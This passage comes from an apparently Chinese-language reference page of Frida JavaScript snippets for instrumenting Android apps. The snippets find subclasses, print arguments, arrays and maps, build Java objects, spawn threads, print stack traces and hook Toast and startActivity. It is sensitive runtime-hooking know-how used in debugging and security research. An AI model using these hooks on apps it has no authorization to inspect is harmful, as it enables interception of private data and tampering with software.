<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findChildBySuper</span>(<span class="params">packageName,superClassName</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">class_name</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;DynamicDex&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 对搜索范围进行限定</span></span><br><span class="line">                <span class="keyword">if</span> (class_name.indexOf(packageName) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">var</span> hook_cls = Java.use(class_name);</span><br><span class="line">                    <span class="keyword">var</span> superClass = hook_cls.class.getSuperclass();</span><br><span class="line">                    <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(superClass.toString().indexOf(superClassName)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">&quot;Found:&quot;</span>,class_name,superClass);</span><br><span class="line">                        &#125;</span><br><span class="line">                        superClass = superClass.getSuperclass();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;findChildBySuper end&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="打印参数">打印参数<a class="header-anchor" href="#打印参数"> ¶ </a></h3>
<h4 id="加载dex使用gson打印">加载dex使用gson打印<a class="header-anchor" href="#加载dex使用gson打印"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.openClassFile(<span class="string">&quot;xxx.dex&quot;</span>).load();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例</span></span><br><span class="line">Java.openClassFile(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).load();</span><br><span class="line"><span class="keyword">const</span> gson = Java.use(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">gson.$new().toJson( object );</span><br></pre></td></tr></table></figure>
<h4 id="查看类与类型强转">查看类与类型强转<a class="header-anchor" href="#查看类与类型强转"> ¶ </a></h4>
<p>对于hook时，找不到相关属性（Frida不清楚类型的），可以使用Cast类型强转来指定类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过反射查看当前实例类型（所属类）</span></span><br><span class="line">.getClass().getName().toString()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类强制转换父类</span></span><br><span class="line">Java.cast()</span><br><span class="line"><span class="keyword">var</span> WaterHandle = Java.cast(JuiceHandle,Java.use(<span class="string">&quot;com.r0ysue.a0526printout.Water&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 父类不能强制转换子类 **/</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据实例对象找到其类名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getObjClassName</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!jclazz) &#123;</span><br><span class="line">        <span class="keyword">var</span> jclazz = Java.use(<span class="string">&quot;java.lang.Class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!jobj) &#123;</span><br><span class="line">        <span class="keyword">var</span> jobj = Java.use(<span class="string">&quot;java.lang.Object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> jclazz.getName.call(jobj.getClass.call(obj));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Array数组">Array数组<a class="header-anchor" href="#Array数组"> ¶ </a></h4>
<h5 id="hook-array数组">hook array数组<a class="header-anchor" href="#hook-array数组"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// char[] [C</span></span><br><span class="line">Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&#x27;[C&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">charArray</span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理byte[] 为[B</span></span><br></pre></td></tr></table></figure>
<h5 id="打印-array数组">打印 array数组<a class="header-anchor" href="#打印-array数组"> ¶ </a></h5>
<ol>
<li>使用gson打印</li>
<li>使用<code>java.util.Arrays.toString()</code>打印</li>
<li>使用<code>JSON.stringify()</code>打印</li>
<li>遍历
<ol>
<li>如果Frida直接打印可以显示为数组，可通过<code>.length</code>属性进行for循环遍历</li>
<li>复杂类型的，如Frida直接打印显示为<code>[[C</code>、<code>[B</code>的，可以使用Java的<code>Array</code>类。<code>Array.getLength()</code>获得长度、<code>Array.get()</code>获得对应元素，<code>Array.getChar()</code>获得char元素</li>
</ol>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Hook Arrays.toString方法 重载char[]</span></span><br><span class="line">        Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString.overload(<span class="string">&quot;[C&quot;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 打印参数</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;arg = &quot;</span>, <span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">// 可正确打印方法1</span></span><br><span class="line">            <span class="comment">// console.log(&quot;arg = &quot;, this.toString(arguments[0]));</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;arg = &quot;</span>, Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString(<span class="built_in">arguments</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="comment">// 可正确打印方法2</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;arg = &quot;</span>, <span class="built_in">JSON</span>.stringify(<span class="built_in">arguments</span>[<span class="number">0</span>]));</span><br><span class="line">            <span class="comment">/* 手动构造一个Java array：参数一为类型，参数二为数组 */</span></span><br><span class="line">            <span class="keyword">var</span> arg = Java.array(<span class="string">&quot;char&quot;</span>, [<span class="string">&quot;上&quot;</span>, <span class="string">&quot;山&quot;</span>, <span class="string">&quot;打&quot;</span>, <span class="string">&quot;老&quot;</span>, <span class="string">&quot;虎&quot;</span>]);</span><br><span class="line">            <span class="keyword">var</span> result = <span class="built_in">this</span>.toString(arg);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[NEW]arg,result = &quot;</span>, arg, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="byte-打印">byte[]打印<a class="header-anchor" href="#byte-打印"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ByteString = Java.use(<span class="string">&quot;com.android.okhttp.okio.ByteString&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(ByteString.of(result).hex());</span><br></pre></td></tr></table></figure>
<p>或者使用<a href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%89%93%E5%8D%B0%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE">格式化打印十六进制数据</a></p>
<h4 id="枚举">枚举<a class="header-anchor" href="#枚举"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.choose(<span class="string">&quot;com.forgotten.fridatestapp.construct.ConstructoredObject&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 找到后获取实例field map的值，尝试转为自定义Enum Signal类型</span></span><br><span class="line">            <span class="keyword">var</span> venum = Java.cast(instance.color.value, Java.use(<span class="string">&quot;com.forgotten.fridatestapp.construct.ConstructoredObject$Signal&quot;</span>));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;venum:&quot;</span>, venum);</span><br><span class="line">            <span class="comment">// 调用Enum的方法</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;venum.name():&quot;</span>, venum.name());</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;venum.ordinal():&quot;</span>, venum.ordinal());</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;venum: search completed&quot;</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="HashMap类型">HashMap类型<a class="header-anchor" href="#HashMap类型"> ¶ </a></h4>
<p>使用iterator迭代打印</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在内存中查找ConstructoredObject类的实例</span></span><br><span class="line">        Java.choose(<span class="string">&quot;com.forgotten.fridatestapp.construct.ConstructoredObject&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 找到后获取实例field map的值，尝试转为HashMap类型</span></span><br><span class="line">                <span class="keyword">var</span> vmap = Java.cast(instance.map.value, Java.use(<span class="string">&quot;java.util.HashMap&quot;</span>));</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;vmap:&quot;</span>, vmap);</span><br><span class="line">                <span class="comment">// 1.</span></span><br><span class="line">                <span class="keyword">var</span> key_iterator = vmap.keySet().iterator();</span><br><span class="line">                <span class="keyword">while</span> (key_iterator.hasNext()) &#123;</span><br><span class="line">                    <span class="keyword">var</span> key = key_iterator.next().toString();</span><br><span class="line">                    <span class="keyword">var</span> value = vmap.get(key).toString();</span><br><span class="line">                    <span class="built_in">console</span>.log(key + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 2.</span></span><br><span class="line">                <span class="keyword">var</span> entry_iterator = vmap.entrySet().iterator();</span><br><span class="line">                <span class="keyword">while</span> (entry_iterator.hasNext()) &#123;</span><br><span class="line">                    <span class="keyword">var</span> entry = Java.cast(entry_iterator.next(),Java.use(<span class="string">&quot;java.util.HashMap$Node&quot;</span>));</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;entry&quot;</span>, entry);</span><br><span class="line">                    <span class="built_in">console</span>.log(entry.getKey(), entry.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 3.</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;vmap.toString():&quot;</span>, vmap.toString());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;vmap: search completed&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="构造参数">构造参数<a class="header-anchor" href="#构造参数"> ¶ </a></h3>
<h4 id="构造Object">构造Object[]<a class="header-anchor" href="#构造Object"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">result = Java.array(<span class="string">&quot;Ljava.lang.Object;&quot;</span>,[Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).$<span class="keyword">new</span>(<span class="number">9</span>),Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$<span class="keyword">new</span>(<span class="string">&quot;nihao&quot;</span>)])</span><br></pre></td></tr></table></figure>
<h5 id="构造-array数组">构造 array数组<a class="header-anchor" href="#构造-array数组"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造char[]数组</span></span><br><span class="line">Java.array(<span class="string">&#x27;char&#x27;</span>, [ <span class="string">&#x27;烟&#x27;</span>,<span class="string">&#x27;村&#x27;</span>,<span class="string">&#x27;四&#x27;</span>,<span class="string">&#x27;五&#x27;</span>,<span class="string">&#x27;家&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造String[]数组</span></span><br><span class="line">Java.array(<span class="string">&#x27;java.lang.String&#x27;</span>, [ <span class="string">&#x27;烟&#x27;</span>,<span class="string">&#x27;村&#x27;</span>,<span class="string">&#x27;四&#x27;</span>,<span class="string">&#x27;五&#x27;</span>,<span class="string">&#x27;家&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> string1 = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> string2 = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// var strarr = Java.array(&quot;java.lang.String&quot;, [string1, string2]);</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建String数组，并添加值</span></span><br><span class="line">        <span class="keyword">var</span> Ref_arr = Java.use(<span class="string">&quot;java.lang.reflect.Array&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> stringClass = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).class;</span><br><span class="line">        <span class="keyword">var</span> arr = Ref_arr.newInstance(stringClass, <span class="number">2</span>);</span><br><span class="line">        Ref_arr.set(arr, <span class="number">0</span>, string1);</span><br><span class="line">        Ref_arr.set(arr, <span class="number">1</span>, string2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> obj1 = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;24717361&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> obj2 = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).$new(<span class="number">19</span>);</span><br><span class="line">        <span class="keyword">var</span> obj3 = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建Object数组</span></span><br><span class="line">        <span class="keyword">var</span> objarr = Java.array(<span class="string">&quot;java.lang.Object&quot;</span>, [arr, obj1, obj2, obj3]);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(objarr))</span><br><span class="line">        <span class="built_in">console</span>.log(Java.use(<span class="string">&quot;java.util.Arrays&quot;</span>).toString(objarr));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Others">Others<a class="header-anchor" href="#Others"> ¶ </a></h3>
<h4 id="Frida构造多线程（新建类）">Frida构造多线程（新建类）<a class="header-anchor" href="#Frida构造多线程（新建类）"> ¶ </a></h4>
<p>新建线程（即实现类时实现Runnable接口）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newThread</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Runnable = Java.use(<span class="string">&quot;java.lang.Runnable&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> Thread = Java.use(<span class="string">&quot;java.lang.Thread&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> MyRunnable = Java.registerClass(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;com.forgotten.thread&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>: [Runnable],</span><br><span class="line">            <span class="attr">fields</span>: &#123;</span><br><span class="line">                <span class="comment">// 成员变量名，与类型</span></span><br><span class="line">                <span class="attr">num</span>: <span class="string">&quot;int&quot;</span>,</span><br><span class="line">                <span class="attr">str</span>: <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="attr">$init</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">returnType</span>: <span class="string">&quot;void&quot;</span>,</span><br><span class="line">                        <span class="attr">argumentTypes</span>: [<span class="string">&quot;int&quot;</span>,<span class="string">&quot;java.lang.String&quot;</span>],</span><br><span class="line">                        <span class="attr">implementation</span>: <span class="function"><span class="keyword">function</span> (<span class="params">num,str</span>) </span>&#123;</span><br><span class="line">                            <span class="built_in">this</span>.num.value = num;</span><br><span class="line">                            <span class="built_in">this</span>.str.value = str;</span><br><span class="line">                        &#125;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">run</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="built_in">this</span>.num.value,<span class="built_in">this</span>.str.value);</span><br><span class="line">                        <span class="built_in">this</span>.num.value = <span class="built_in">this</span>.num.value + <span class="number">1</span>;</span><br><span class="line">                        Thread.sleep(<span class="number">5</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> myRunnable = MyRunnable.$new(<span class="number">10</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> myThread = Thread.$new(myRunnable);</span><br><span class="line">        myThread.start();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="获取context">获取context<a class="header-anchor" href="#获取context"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getContext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> currentApplication = Java.use(<span class="string">&quot;android.app.ActivityThread&quot;</span>).currentApplication();</span><br><span class="line">        <span class="built_in">console</span>.log(currentApplication);</span><br><span class="line">        <span class="keyword">var</span> context = currentApplication.getApplicationContext();</span><br><span class="line">        <span class="built_in">console</span>.log(context);</span><br><span class="line">        <span class="keyword">var</span> packageName = context.getPackageName();</span><br><span class="line">        <span class="built_in">console</span>.log(packageName);</span><br><span class="line">        <span class="built_in">console</span>.log(currentApplication.getPackageName());</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="强制主线程运行">强制主线程运行<a class="header-anchor" href="#强制主线程运行"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> Toast = Java.use(<span class="string">&#x27;android.widget.Toast&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> currentApplication = Java.use(<span class="string">&#x27;android.app.ActivityThread&#x27;</span>).currentApplication(); </span><br><span class="line">  <span class="keyword">var</span> context = currentApplication.getApplicationContext();</span><br><span class="line"></span><br><span class="line">  Java.scheduleOnMainThread(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">&quot;Hello World&quot;</span>, Toast.LENGTH_LONG.value).show();</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="java层代码模板复用">java层代码模板复用<a class="header-anchor" href="#java层代码模板复用"> ¶ </a></h2>
<h3 id="打印调用栈">打印调用栈<a class="header-anchor" href="#打印调用栈"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Exception = Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = Exception.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.toString();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.replace(<span class="regexp">/,/g</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(replaceStr);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            Exception.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> throwable = Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(throwable);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sample 2</span></span><br><span class="line"><span class="keyword">var</span> exception = Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>).$new());</span><br><span class="line"><span class="built_in">console</span>.log(exception);</span><br></pre></td></tr></table></figure>
<h3 id="格式化打印十六进制数据">格式化打印十六进制数据<a class="header-anchor" href="#格式化打印十六进制数据"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 十六进制打印数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>array 数组</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>off 偏移</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;*&#125;</span> </span>len 长度</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jhexdump</span>(<span class="params">array, off, len</span>) </span>&#123;</span><br><span class="line">    off = off || <span class="number">0</span>;</span><br><span class="line">    len = len || <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> llen = len == <span class="number">0</span> ? array.length : len;</span><br><span class="line">    <span class="keyword">var</span> ptr = Memory.alloc(llen);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; llen; ++i) Memory.writeS8(ptr.add(i), array[i]);</span><br><span class="line">    <span class="comment">//console.log(hexdump(ptr, &#123; offset: off, length: len, header: false, ansi: false &#125;));</span></span><br><span class="line">    <span class="built_in">console</span>.log(hexdump(ptr, &#123; <span class="attr">offset</span>: off == <span class="number">0</span> ? <span class="number">0</span> : off, <span class="attr">length</span>: llen, <span class="attr">header</span>: <span class="literal">false</span>, <span class="attr">ansi</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="事件">事件<a class="header-anchor" href="#事件"> ¶ </a></h3>
<h4 id="hook-Toast提示-定位">hook Toast提示 定位<a class="header-anchor" href="#hook-Toast提示-定位"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_toast</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">printStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">        Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> throwable = Java.use(<span class="string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new());</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(throwable);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Toast = Java.use(<span class="string">&quot;android.widget.Toast&quot;</span>);</span><br><span class="line">        Toast.show.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            printStack(<span class="string">&quot;SHOW Toast&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(hook_toast);</span><br></pre></td></tr></table></figure>
<h4 id="hook-findViewById-定位组件">hook findViewById 定位组件<a class="header-anchor" href="#hook-findViewById-定位组件"> ¶ </a></h4>
<h4 id="hook-StartActivity">hook StartActivity<a class="header-anchor" href="#hook-StartActivity"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Activity = Java.use(<span class="string">&quot;android.app.Activity&quot;</span>);</span><br><span class="line">    <span class="comment">//console.log(Object.getOwnPropertyNames(Activity));</span></span><br><span class="line">    Activity.startActivity.overload(<span class="string">&#x27;android.content.Intent&#x27;</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">p1</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Hooking android.app.Activity.startActivity(p1) successfully,p1=&quot;</span>+p1);</span><br><span class="line">        <span class="comment">//console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()));</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="built_in">decodeURIComponent</span>(p1.toUri(<span class="number">256</span>)));</span><br><span class="line">        <span class="built_in">this</span>.startActivity(p1);</span><br><span class="line">    &#125;</span><br><span class="line">    Activity.startActivity.overload(<span class="string">&#x27;android.content.Intent&#x27;</span>, <span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">p1,p2</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Hooking android.app.Activity.startActivity(p1,p2) successfully,p1=&quot;</span>+p1+<span 